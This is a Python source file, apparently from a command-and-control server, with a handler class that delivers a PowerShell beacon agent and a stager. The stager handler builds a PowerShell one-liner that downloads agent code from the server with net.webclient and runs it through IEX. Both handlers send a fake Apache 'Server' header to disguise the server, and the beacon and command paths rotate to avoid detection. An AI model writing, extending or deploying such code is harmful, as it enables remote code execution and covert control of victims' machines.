from handlers.base_handler import BaseHandler
from utils.agent_generator import generate_agent_code

class AgentHandler(BaseHandler):
    """Handler for agent code delivery requests"""
    
    def handle_agent_request(self):
        """Send PowerShell agent code to client"""
        # Get the server address
        server_address = f"{self.server.server_address[0]}:{self.server.server_address[1]}"
        
        # Get current paths and rotation info
        current_paths = self.path_router.get_current_paths()
        rotation_info = self.path_router.get_rotation_info()
        
        # Generate the agent code with simplified parameters
        agent_code = generate_agent_code(
            server_address=server_address, 
            beacon_path=current_paths["beacon_path"],
            cmd_result_path=current_paths["cmd_result_path"],
            rotation_info=rotation_info
        )

        # Send response with additional headers
        headers = {
            "Cache-Control": "max-age=3600, must-revalidate",
            "Server": "Apache/2.4.41 (Ubuntu)"
        }
        self.send_response(200, "text/plain", agent_code, headers)
        
    def handle_stager_request(self):
        """Send Base64 encoded stager to client"""
        # Get the current agent path
        current_paths = self.path_router.get_current_paths()
        agent_path = current_paths["agent_path"]
        
        # Create the stager code
        server_address = self.server.server_address
        stager_code = f"$V=new-object net.webclient;$S=$V.DownloadString('http://{server_address[0]}:{server_address[1]}{agent_path}');IEX($S)"
        
        # Send response with additional headers
        headers = {
            "Cache-Control": "max-age=3600, must-revalidate",
            "Server": "Apache/2.4.41 (Ubuntu)"
        }
        self.send_response(200, "text/plain", stager_code, headers)